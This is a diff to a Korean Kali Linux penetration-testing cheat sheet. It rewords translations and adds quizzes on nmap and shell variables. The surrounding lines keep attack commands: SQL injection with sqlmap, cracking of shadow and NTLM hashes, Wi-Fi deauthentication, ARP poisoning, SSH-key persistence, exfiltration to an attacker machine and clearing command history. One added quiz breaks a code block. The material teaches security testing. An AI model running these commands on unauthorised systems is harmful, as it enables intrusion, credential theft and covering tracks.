@@ -1,6 +1,6 @@
 ---
-title: '칼리 리눅스 치트 시트'
-description: '필수 명령어, 개념 및 모범 사례를 다루는 포괄적인 치트 시트로 칼리 리눅스를 학습하세요.'
+title: 'Kali Linux 치트 시트 | LabEx'
+description: '이 종합 치트 시트로 Kali Linux 침투 테스트를 배우세요. 보안 도구, 윤리적 해킹, 취약점 스캔, 익스플로잇 및 사이버 보안 테스트를 위한 빠른 참조 자료입니다.'
 pdfUrl: '/cheatsheets/pdf/kali-linux-cheatsheet.pdf'
 ---
 
@@ -45,7 +45,7 @@ sudo apt install curl wget git
 sudo useradd -m username
 # 암호 설정
 sudo passwd username
-# 사용자를 sudo 그룹에 추가
+# sudo 그룹에 사용자 추가
 sudo usermod -aG sudo username
 # 사용자 전환
 su - username
@@ -88,11 +88,26 @@ sudo ifconfig wlan0 up
 ```bash
 # 대상 IP 설정
 export TARGET=192.168.1.1
-# 워드 리스트 경로 설정
+# 단어장 경로 설정
 export WORDLIST=/usr/share/wordlists/rockyou.txt
 # 환경 변수 확인
 env | grep TARGET
 ```
+
+<BaseQuiz id="kali-env-1" correct="C">
+  <template #question>
+    `export` 로 설정된 환경 변수는 어떻게 되나요?
+  </template>
+  
+  <BaseQuizOption value="A">시스템 재부팅 후에도 유지됩니다</BaseQuizOption>
+  <BaseQuizOption value="B">현재 파일에서만 사용할 수 있습니다</BaseQuizOption>
+  <BaseQuizOption value="C" correct>현재 셸과 자식 프로세스에서 사용할 수 있습니다</BaseQuizOption>
+  <BaseQuizOption value="D">전역 시스템 변수입니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `export` 로 설정된 환경 변수는 현재 셸 세션과 그로부터 생성된 모든 자식 프로세스에서 사용할 수 있습니다. 셸 구성 파일 (.bashrc 등) 에 추가되지 않는 한 셸 세션이 종료되면 사라집니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
 
 ### 도구 설치: `apt install`
 
@@ -126,7 +141,7 @@ masscan --ping 192.168.1.0/24
 
 ### 포트 스캐닝: `nmap`
 
-대상 시스템에서 열린 포트 및 실행 중인 서비스를 스캔합니다.
+대상 시스템에서 열린 포트와 실행 중인 서비스를 스캔합니다.
 
 ```bash
 # 기본 TCP 스캔
@@ -139,6 +154,21 @@ nmap -sU 192.168.1.1
 nmap -sS 192.168.1.1
 ```
 
+<BaseQuiz id="kali-nmap-1" correct="B">
+  <template #question>
+    `nmap -sS`는 무엇을 수행합니까?
+  </template>
+  
+  <BaseQuizOption value="A">UDP 스캔을 수행합니다</BaseQuizOption>
+  <BaseQuizOption value="B" correct>스텔스 SYN 스캔 (반 개방 스캔) 을 수행합니다</BaseQuizOption>
+  <BaseQuizOption value="C">모든 포트를 스캔합니다</BaseQuizOption>
+  <BaseQuizOption value="D">OS 탐지를 수행합니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-sS` 플래그는 TCP 핸드셰이크를 완료하지 않기 때문에 SYN 스캔 (반 개방 스캔이라고도 함) 을 수행합니다. SYN 패킷을 보내고 응답을 분석하여 완전한 TCP 연결 스캔보다 은밀합니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
+
 ### 서비스 열거: `nmap -sV`
 
 서비스 버전 및 잠재적 취약점을 식별합니다.
@@ -148,9 +178,25 @@ nmap -sS 192.168.1.1
 nmap -sV 192.168.1.1
 # OS 탐지
 nmap -O 192.168.1.1
+```
+
+<BaseQuiz id="kali-enumeration-1" correct="A">
+  <template #question>
+    `nmap -sV`는 무엇을 수행합니까?
+  </template>
+  
+  <BaseQuizOption value="A" correct>열린 포트에서 실행 중인 서비스 버전을 탐지합니다</BaseQuizOption>
+  <BaseQuizOption value="B">버전 제어 포트만 스캔합니다</BaseQuizOption>
+  <BaseQuizOption value="C">취약한 서비스만 표시합니다</BaseQuizOption>
+  <BaseQuizOption value="D">OS 탐지만 수행합니다</BaseQuizOption>
+  
+  <BaseQuizAnswer>
+    `-sV` 플래그는 버전 탐지를 활성화하여 열린 포트를 프로빙하여 어떤 서비스와 버전이 실행 중인지 확인합니다. 이는 특정 소프트웨어 버전과 관련된 잠재적 취약점을 식별하는 데 유용합니다.
+  </BaseQuizAnswer>
+</BaseQuiz>
 # 스크립트 스캐닝
 nmap -sC 192.168.1.1
-# 포괄적 스캔
+# 포괄적인 스캔
 nmap -sS -sV -O -A 192.168.1.1
 ```
 
@@ -178,7 +224,7 @@ dnsrecon -d example.com
 ```bash
 # 디렉터리 무차별 대입 공격
 dirb http://192.168.1.1
-# 사용자 지정 워드 리스트
+# 사용자 지정 단어장
 dirb http://192.168.1.1 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 # Gobuster 대안
 gobuster dir -u http://192.168.1.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
@@ -204,7 +250,7 @@ SSL/TLS 구성 및 취약점을 분석합니다.
 ```bash
 # SSL 스캔
 sslscan 192.168.1.1:443
-# Testssl 포괄적 분석
+# Testssl 종합 분석
 testssl.sh https://example.com
 # SSL 인증서 정보
 openssl s_client -connect example.com:443
@@ -219,7 +265,7 @@ SMB 공유 및 NetBIOS 정보를 열거합니다.
 enum4linux 192.168.1.1
 # SMB 공유 나열
 smbclient -L //192.168.1.1
-# 공유에 연결
+# 공유 연결
 smbclient //192.168.1.1/share
 # SMB 취약점 스캔
 nmap --script smb-vuln* 192.168.1.1
@@ -230,7 +276,7 @@ nmap --script smb-vuln* 192.168.1.1
 SNMP 프로토콜을 통해 시스템 정보를 수집합니다.
 
 ```bash
-# SNMP walk
+# SNMP 워크
 snmpwalk -c public -v1 192.168.1.1
 # SNMP 확인
 onesixtyone -c community.txt 192.168.1.1
@@ -251,7 +297,7 @@ sudo systemctl start nessusd
 openvas-start
 # Nikto 웹 취약점 스캐너
 nikto -h http://192.168.1.1
-# SQL 인젝션을 위한 SQLmap
+# SQL 주입을 위한 SQLmap
 sqlmap -u "http://example.com/page.php?id=1"
 ```
 
@@ -318,7 +364,7 @@ GPU 가속을 사용하여 암호 해시를 크래킹합니다.
 hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 # NTLM 해시 크래킹
 hashcat -m 1000 -a 0 ntlm.hash wordlist.txt
-# 워드 리스트 변형 생성
+# 단어장 변형 생성
 hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
 ```
 
@@ -329,7 +375,7 @@ hashcat --stdout -r /usr/share/hashcat/rules/best64.rule wordlist.txt
 ```bash
 # 암호 파일 크래킹
 john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
-# 크래킹된 암호 표시
+# 크래킹된 암호 보기
 john --show shadow.txt
 # 증분 모드
 john --incremental shadow.txt
@@ -337,12 +383,12 @@ john --incremental shadow.txt
 john --rules --wordlist=passwords.txt shadow.txt
 ```
 
-### 워드 리스트 생성: `crunch`
+### 단어장 생성: `crunch`
 
-대상 공격을 위한 사용자 지정 워드 리스트를 생성합니다.
+대상 공격을 위한 사용자 지정 단어장을 생성합니다.
 
 ```bash
-# 4-8자리 워드 리스트 생성
+# 4-8 자리 단어장 생성
 crunch 4 8 -o wordlist.txt
 # 사용자 지정 문자 집합
 crunch 6 6 -t admin@ -o passwords.txt
@@ -387,7 +433,7 @@ WPA/WPA2 암호화된 네트워크에 대한 공격을 수행합니다.
 sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon
 # 캡처된 핸드셰이크 크래킹
 aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
-# Reaver를 사용한 WPS 공격
+# Reaver 를 사용한 WPS 공격
 reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv
 ```
 
@@ -406,12 +452,12 @@ ettercap -T -M arp:remote /192.168.1.0/24//
 
 ## 웹 애플리케이션 보안 테스트
 
-### SQL 인젝션 테스트: `sqlmap`
+### SQL 주입 테스트: `sqlmap`
 
-자동화된 SQL 인젝션 탐지 및 익스플로잇.
+자동화된 SQL 주입 탐지 및 익스플로잇.
 
 ```bash
-# 기본 SQL 인젝션 테스트
+# 기본 SQL 주입 테스트
 sqlmap -u "http://example.com/page.php?id=1"
 # POST 매개변수 테스트
 sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"
@@ -489,7 +535,7 @@ echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
 
 ### 데이터 유출: `scp`
 
-손상된 시스템에서 보안 방식으로 데이터를 전송합니다.
+손상된 시스템에서 데이터를 안전하게 전송합니다.
 
 ```bash
 # 공격자 머신으로 파일 복사
@@ -503,7 +549,7 @@ python3 -m http.server 8000
 
 ### 흔적 지우기: `history`
 
-손상된 시스템에서 활동 기록을 제거합니다.
+손상된 시스템에서 활동 증거를 제거합니다.
 
 ```bash
 # bash 기록 지우기
@@ -575,7 +621,7 @@ foremost -i capture.pcap -o extracted/
 
 ### 스크린샷 캡처: `gnome-screenshot`
 
-체계적인 스크린샷 캡처로 발견 사항을 문서화합니다.
+체계적인 스크린샷 캡처로 결과를 문서화합니다.
 
 ```bash
 # 전체 화면 캡처
@@ -606,17 +652,17 @@ scriptreplay session.time session.log
 전문적인 침투 테스트 보고서를 생성합니다.
 
 ```bash
-# 보고 도구 설치
+# 보고서 도구 설치
 pip3 install reportlab
 # PDF 보고서 생성
 python3 generate_report.py
-# Markdown을 PDF로 변환
+# Markdown 을 PDF 로 변환
 pandoc report.md -o report.pdf
 ```
 
 ### 증거 무결성: `sha256sum`
 
-암호화 해시를 사용하여 보관 사슬을 유지합니다.
+암호화 해시를 사용하여 관리 체인을 유지합니다.
 
 ```bash
 # 체크섬 생성
@@ -701,7 +747,7 @@ alias ll='ls -la'
 alias nse='nmap --script-help'
 alias target='export TARGET='
 alias msf='msfconsole -q'
-# bashrc 새로 고침
+# bashrc 다시 로드
 source ~/.bashrc
 ```
 
@@ -731,12 +777,12 @@ function pentest-setup() {
 # Ctrl+L - 화면 지우기
 # Ctrl+R - 명령 기록 검색
 # Tab - 명령 자동 완성
-# Up/Down - 명령 기록 탐색
+# 위/아래 - 명령 기록 탐색
 ```
 
 ### 환경 구성: `tmux`
 
-장기 실행 작업을 위해 영구적인 터미널 세션을 설정합니다.
+장시간 실행되는 작업을 위해 영구적인 터미널 세션을 설정합니다.
 
 ```bash
 # 새 세션 시작
